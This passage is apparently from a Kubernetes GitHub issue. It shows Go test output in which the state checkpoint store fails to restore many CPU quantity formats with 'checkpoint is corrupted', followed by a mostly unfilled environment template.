=== RUN   Test_stateCheckpoint_storeState/format_5_-_cpu_1Ei
=== RUN   Test_stateCheckpoint_storeState/format_6_-_cpu_1n
=== RUN   Test_stateCheckpoint_storeState/format_7_-_cpu_1u
=== RUN   Test_stateCheckpoint_storeState/format_8_-_cpu_1m
=== RUN   Test_stateCheckpoint_storeState/format_9_-_cpu_1k
=== RUN   Test_stateCheckpoint_storeState/format_10_-_cpu_1M
=== RUN   Test_stateCheckpoint_storeState/format_11_-_cpu_1G
=== RUN   Test_stateCheckpoint_storeState/format_12_-_cpu_1T
=== RUN   Test_stateCheckpoint_storeState/format_13_-_cpu_1P
=== RUN   Test_stateCheckpoint_storeState/format_14_-_cpu_1E
=== RUN   Test_stateCheckpoint_storeState/format_15_-_cpu_1
=== RUN   Test_stateCheckpoint_storeState/format_16_-_cpu_0.1Ki
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_17_-_cpu_0.1Mi
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_18_-_cpu_0.1Gi
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_19_-_cpu_0.1Ti
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_20_-_cpu_0.1Pi
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_21_-_cpu_0.1Ei
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_22_-_cpu_0.1n
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_23_-_cpu_0.1u
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_24_-_cpu_0.1m
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_25_-_cpu_0.1k
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_26_-_cpu_0.1M
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_27_-_cpu_0.1G
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_28_-_cpu_0.1T
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_29_-_cpu_0.1P
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_30_-_cpu_0.1E
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_31_-_cpu_0.1
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_32_-_cpu_0.03Ki
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_33_-_cpu_0.03Mi
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_34_-_cpu_0.03Gi
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_35_-_cpu_0.03Ti
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_36_-_cpu_0.03Pi
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_37_-_cpu_0.03Ei
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_38_-_cpu_0.03n
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_39_-_cpu_0.03u
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_40_-_cpu_0.03m
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_41_-_cpu_0.03k
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_42_-_cpu_0.03M
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_43_-_cpu_0.03G
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_44_-_cpu_0.03T
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_45_-_cpu_0.03P
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_46_-_cpu_0.03E
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_47_-_cpu_0.03
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_48_-_cpu_10Ki
=== RUN   Test_stateCheckpoint_storeState/format_49_-_cpu_10Mi
=== RUN   Test_stateCheckpoint_storeState/format_50_-_cpu_10Gi
=== RUN   Test_stateCheckpoint_storeState/format_51_-_cpu_10Ti
=== RUN   Test_stateCheckpoint_storeState/format_52_-_cpu_10Pi
=== RUN   Test_stateCheckpoint_storeState/format_53_-_cpu_10Ei
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_54_-_cpu_10n
=== RUN   Test_stateCheckpoint_storeState/format_55_-_cpu_10u
=== RUN   Test_stateCheckpoint_storeState/format_56_-_cpu_10m
=== RUN   Test_stateCheckpoint_storeState/format_57_-_cpu_10k
=== RUN   Test_stateCheckpoint_storeState/format_58_-_cpu_10M
=== RUN   Test_stateCheckpoint_storeState/format_59_-_cpu_10G
=== RUN   Test_stateCheckpoint_storeState/format_60_-_cpu_10T
=== RUN   Test_stateCheckpoint_storeState/format_61_-_cpu_10P
=== RUN   Test_stateCheckpoint_storeState/format_62_-_cpu_10E
=== RUN   Test_stateCheckpoint_storeState/format_63_-_cpu_10
=== RUN   Test_stateCheckpoint_storeState/format_64_-_cpu_100Ki
=== RUN   Test_stateCheckpoint_storeState/format_65_-_cpu_100Mi
=== RUN   Test_stateCheckpoint_storeState/format_66_-_cpu_100Gi
=== RUN   Test_stateCheckpoint_storeState/format_67_-_cpu_100Ti
=== RUN   Test_stateCheckpoint_storeState/format_68_-_cpu_100Pi
=== RUN   Test_stateCheckpoint_storeState/format_69_-_cpu_100Ei
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_70_-_cpu_100n
=== RUN   Test_stateCheckpoint_storeState/format_71_-_cpu_100u
=== RUN   Test_stateCheckpoint_storeState/format_72_-_cpu_100m
=== RUN   Test_stateCheckpoint_storeState/format_73_-_cpu_100k
=== RUN   Test_stateCheckpoint_storeState/format_74_-_cpu_100M
=== RUN   Test_stateCheckpoint_storeState/format_75_-_cpu_100G
=== RUN   Test_stateCheckpoint_storeState/format_76_-_cpu_100T
=== RUN   Test_stateCheckpoint_storeState/format_77_-_cpu_100P
=== RUN   Test_stateCheckpoint_storeState/format_78_-_cpu_100E
=== RUN   Test_stateCheckpoint_storeState/format_79_-_cpu_100
=== RUN   Test_stateCheckpoint_storeState/format_80_-_cpu_512Ki
=== RUN   Test_stateCheckpoint_storeState/format_81_-_cpu_512Mi
=== RUN   Test_stateCheckpoint_storeState/format_82_-_cpu_512Gi
=== RUN   Test_stateCheckpoint_storeState/format_83_-_cpu_512Ti
=== RUN   Test_stateCheckpoint_storeState/format_84_-_cpu_512Pi
=== RUN   Test_stateCheckpoint_storeState/format_85_-_cpu_512Ei
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_86_-_cpu_512n
=== RUN   Test_stateCheckpoint_storeState/format_87_-_cpu_512u
=== RUN   Test_stateCheckpoint_storeState/format_88_-_cpu_512m
=== RUN   Test_stateCheckpoint_storeState/format_89_-_cpu_512k
=== RUN   Test_stateCheckpoint_storeState/format_90_-_cpu_512M
=== RUN   Test_stateCheckpoint_storeState/format_91_-_cpu_512G
=== RUN   Test_stateCheckpoint_storeState/format_92_-_cpu_512T
=== RUN   Test_stateCheckpoint_storeState/format_93_-_cpu_512P
=== RUN   Test_stateCheckpoint_storeState/format_94_-_cpu_512E
=== RUN   Test_stateCheckpoint_storeState/format_95_-_cpu_512
=== RUN   Test_stateCheckpoint_storeState/format_96_-_cpu_1000Ki
=== RUN   Test_stateCheckpoint_storeState/format_97_-_cpu_1000Mi
=== RUN   Test_stateCheckpoint_storeState/format_98_-_cpu_1000Gi
=== RUN   Test_stateCheckpoint_storeState/format_99_-_cpu_1000Ti
=== RUN   Test_stateCheckpoint_storeState/format_100_-_cpu_1000Pi
=== RUN   Test_stateCheckpoint_storeState/format_101_-_cpu_1000Ei
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_102_-_cpu_1000n
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_103_-_cpu_1000u
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_104_-_cpu_1000m
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_105_-_cpu_1000k
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_106_-_cpu_1000M
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_107_-_cpu_1000G
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_108_-_cpu_1000T
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_109_-_cpu_1000P
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_110_-_cpu_1000E
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_111_-_cpu_1000
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_112_-_cpu_1024Ki
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_113_-_cpu_1024Mi
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_114_-_cpu_1024Gi
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_115_-_cpu_1024Ti
=== RUN   Test_stateCheckpoint_storeState/format_116_-_cpu_1024Pi
=== RUN   Test_stateCheckpoint_storeState/format_117_-_cpu_1024Ei
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_118_-_cpu_1024n
=== RUN   Test_stateCheckpoint_storeState/format_119_-_cpu_1024u
=== RUN   Test_stateCheckpoint_storeState/format_120_-_cpu_1024m
=== RUN   Test_stateCheckpoint_storeState/format_121_-_cpu_1024k
=== RUN   Test_stateCheckpoint_storeState/format_122_-_cpu_1024M
=== RUN   Test_stateCheckpoint_storeState/format_123_-_cpu_1024G
=== RUN   Test_stateCheckpoint_storeState/format_124_-_cpu_1024T
=== RUN   Test_stateCheckpoint_storeState/format_125_-_cpu_1024P
=== RUN   Test_stateCheckpoint_storeState/format_126_-_cpu_1024E
=== RUN   Test_stateCheckpoint_storeState/format_127_-_cpu_1024
=== RUN   Test_stateCheckpoint_storeState/format_128_-_cpu_700Ki
=== RUN   Test_stateCheckpoint_storeState/format_129_-_cpu_700Mi
=== RUN   Test_stateCheckpoint_storeState/format_130_-_cpu_700Gi
=== RUN   Test_stateCheckpoint_storeState/format_131_-_cpu_700Ti
=== RUN   Test_stateCheckpoint_storeState/format_132_-_cpu_700Pi
=== RUN   Test_stateCheckpoint_storeState/format_133_-_cpu_700Ei
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_134_-_cpu_700n
=== RUN   Test_stateCheckpoint_storeState/format_135_-_cpu_700u
=== RUN   Test_stateCheckpoint_storeState/format_136_-_cpu_700m
=== RUN   Test_stateCheckpoint_storeState/format_137_-_cpu_700k
=== RUN   Test_stateCheckpoint_storeState/format_138_-_cpu_700M
=== RUN   Test_stateCheckpoint_storeState/format_139_-_cpu_700G
=== RUN   Test_stateCheckpoint_storeState/format_140_-_cpu_700T
=== RUN   Test_stateCheckpoint_storeState/format_141_-_cpu_700P
=== RUN   Test_stateCheckpoint_storeState/format_142_-_cpu_700E
=== RUN   Test_stateCheckpoint_storeState/format_143_-_cpu_700
=== RUN   Test_stateCheckpoint_storeState/format_144_-_cpu_10000Ki
=== RUN   Test_stateCheckpoint_storeState/format_145_-_cpu_10000Mi
=== RUN   Test_stateCheckpoint_storeState/format_146_-_cpu_10000Gi
=== RUN   Test_stateCheckpoint_storeState/format_147_-_cpu_10000Ti
=== RUN   Test_stateCheckpoint_storeState/format_148_-_cpu_10000Pi
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_149_-_cpu_10000Ei
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_150_-_cpu_10000n
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_151_-_cpu_10000u
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_152_-_cpu_10000m
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_153_-_cpu_10000k
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_154_-_cpu_10000M
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_155_-_cpu_10000G
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_156_-_cpu_10000T
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_157_-_cpu_10000P
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_158_-_cpu_10000E
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
=== RUN   Test_stateCheckpoint_storeState/format_159_-_cpu_10000
    state_checkpoint_test.go:82: failed to restore state: checkpoint is corrupted
--- FAIL: Test_stateCheckpoint_storeState (1.43s)
    --- PASS: Test_stateCheckpoint_storeState/format_0_-_cpu_1Ki (0.02s)
    --- PASS: Test_stateCheckpoint_storeState/format_1_-_cpu_1Mi (0.04s)
    --- PASS: Test_stateCheckpoint_storeState/format_2_-_cpu_1Gi (0.03s)
    --- PASS: Test_stateCheckpoint_storeState/format_3_-_cpu_1Ti (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_4_-_cpu_1Pi (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_5_-_cpu_1Ei (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_6_-_cpu_1n (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_7_-_cpu_1u (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_8_-_cpu_1m (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_9_-_cpu_1k (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_10_-_cpu_1M (0.00s)
    --- PASS: Test_stateCheckpoint_storeState/format_11_-_cpu_1G (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_12_-_cpu_1T (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_13_-_cpu_1P (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_14_-_cpu_1E (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_15_-_cpu_1 (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_16_-_cpu_0.1Ki (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_17_-_cpu_0.1Mi (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_18_-_cpu_0.1Gi (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_19_-_cpu_0.1Ti (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_20_-_cpu_0.1Pi (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_21_-_cpu_0.1Ei (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_22_-_cpu_0.1n (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_23_-_cpu_0.1u (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_24_-_cpu_0.1m (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_25_-_cpu_0.1k (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_26_-_cpu_0.1M (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_27_-_cpu_0.1G (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_28_-_cpu_0.1T (0.00s)
    --- FAIL: Test_stateCheckpoint_storeState/format_29_-_cpu_0.1P (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_30_-_cpu_0.1E (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_31_-_cpu_0.1 (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_32_-_cpu_0.03Ki (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_33_-_cpu_0.03Mi (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_34_-_cpu_0.03Gi (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_35_-_cpu_0.03Ti (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_36_-_cpu_0.03Pi (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_37_-_cpu_0.03Ei (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_38_-_cpu_0.03n (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_39_-_cpu_0.03u (0.02s)
    --- FAIL: Test_stateCheckpoint_storeState/format_40_-_cpu_0.03m (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_41_-_cpu_0.03k (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_42_-_cpu_0.03M (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_43_-_cpu_0.03G (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_44_-_cpu_0.03T (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_45_-_cpu_0.03P (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_46_-_cpu_0.03E (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_47_-_cpu_0.03 (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_48_-_cpu_10Ki (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_49_-_cpu_10Mi (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_50_-_cpu_10Gi (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_51_-_cpu_10Ti (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_52_-_cpu_10Pi (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_53_-_cpu_10Ei (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_54_-_cpu_10n (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_55_-_cpu_10u (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_56_-_cpu_10m (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_57_-_cpu_10k (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_58_-_cpu_10M (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_59_-_cpu_10G (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_60_-_cpu_10T (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_61_-_cpu_10P (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_62_-_cpu_10E (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_63_-_cpu_10 (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_64_-_cpu_100Ki (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_65_-_cpu_100Mi (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_66_-_cpu_100Gi (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_67_-_cpu_100Ti (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_68_-_cpu_100Pi (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_69_-_cpu_100Ei (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_70_-_cpu_100n (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_71_-_cpu_100u (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_72_-_cpu_100m (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_73_-_cpu_100k (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_74_-_cpu_100M (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_75_-_cpu_100G (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_76_-_cpu_100T (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_77_-_cpu_100P (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_78_-_cpu_100E (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_79_-_cpu_100 (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_80_-_cpu_512Ki (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_81_-_cpu_512Mi (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_82_-_cpu_512Gi (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_83_-_cpu_512Ti (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_84_-_cpu_512Pi (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_85_-_cpu_512Ei (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_86_-_cpu_512n (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_87_-_cpu_512u (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_88_-_cpu_512m (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_89_-_cpu_512k (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_90_-_cpu_512M (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_91_-_cpu_512G (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_92_-_cpu_512T (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_93_-_cpu_512P (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_94_-_cpu_512E (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_95_-_cpu_512 (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_96_-_cpu_1000Ki (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_97_-_cpu_1000Mi (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_98_-_cpu_1000Gi (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_99_-_cpu_1000Ti (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_100_-_cpu_1000Pi (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_101_-_cpu_1000Ei (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_102_-_cpu_1000n (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_103_-_cpu_1000u (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_104_-_cpu_1000m (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_105_-_cpu_1000k (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_106_-_cpu_1000M (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_107_-_cpu_1000G (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_108_-_cpu_1000T (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_109_-_cpu_1000P (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_110_-_cpu_1000E (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_111_-_cpu_1000 (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_112_-_cpu_1024Ki (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_113_-_cpu_1024Mi (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_114_-_cpu_1024Gi (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_115_-_cpu_1024Ti (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_116_-_cpu_1024Pi (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_117_-_cpu_1024Ei (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_118_-_cpu_1024n (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_119_-_cpu_1024u (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_120_-_cpu_1024m (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_121_-_cpu_1024k (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_122_-_cpu_1024M (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_123_-_cpu_1024G (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_124_-_cpu_1024T (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_125_-_cpu_1024P (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_126_-_cpu_1024E (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_127_-_cpu_1024 (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_128_-_cpu_700Ki (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_129_-_cpu_700Mi (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_130_-_cpu_700Gi (0.02s)
    --- PASS: Test_stateCheckpoint_storeState/format_131_-_cpu_700Ti (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_132_-_cpu_700Pi (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_133_-_cpu_700Ei (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_134_-_cpu_700n (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_135_-_cpu_700u (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_136_-_cpu_700m (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_137_-_cpu_700k (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_138_-_cpu_700M (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_139_-_cpu_700G (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_140_-_cpu_700T (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_141_-_cpu_700P (0.03s)
    --- PASS: Test_stateCheckpoint_storeState/format_142_-_cpu_700E (0.02s)
    --- PASS: Test_stateCheckpoint_storeState/format_143_-_cpu_700 (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_144_-_cpu_10000Ki (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_145_-_cpu_10000Mi (0.01s)
    --- PASS: Test_stateCheckpoint_storeState/format_146_-_cpu_10000Gi (0.02s)
    --- PASS: Test_stateCheckpoint_storeState/format_147_-_cpu_10000Ti (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_148_-_cpu_10000Pi (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_149_-_cpu_10000Ei (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_150_-_cpu_10000n (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_151_-_cpu_10000u (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_152_-_cpu_10000m (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_153_-_cpu_10000k (0.02s)
    --- FAIL: Test_stateCheckpoint_storeState/format_154_-_cpu_10000M (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_155_-_cpu_10000G (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_156_-_cpu_10000T (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_157_-_cpu_10000P (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_158_-_cpu_10000E (0.01s)
    --- FAIL: Test_stateCheckpoint_storeState/format_159_-_cpu_10000 (0.02s)
FAIL

```
</details>

#### Kubernetes version

The bug happened in version 1.28, but it will happen in latest version 1.31 too.


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


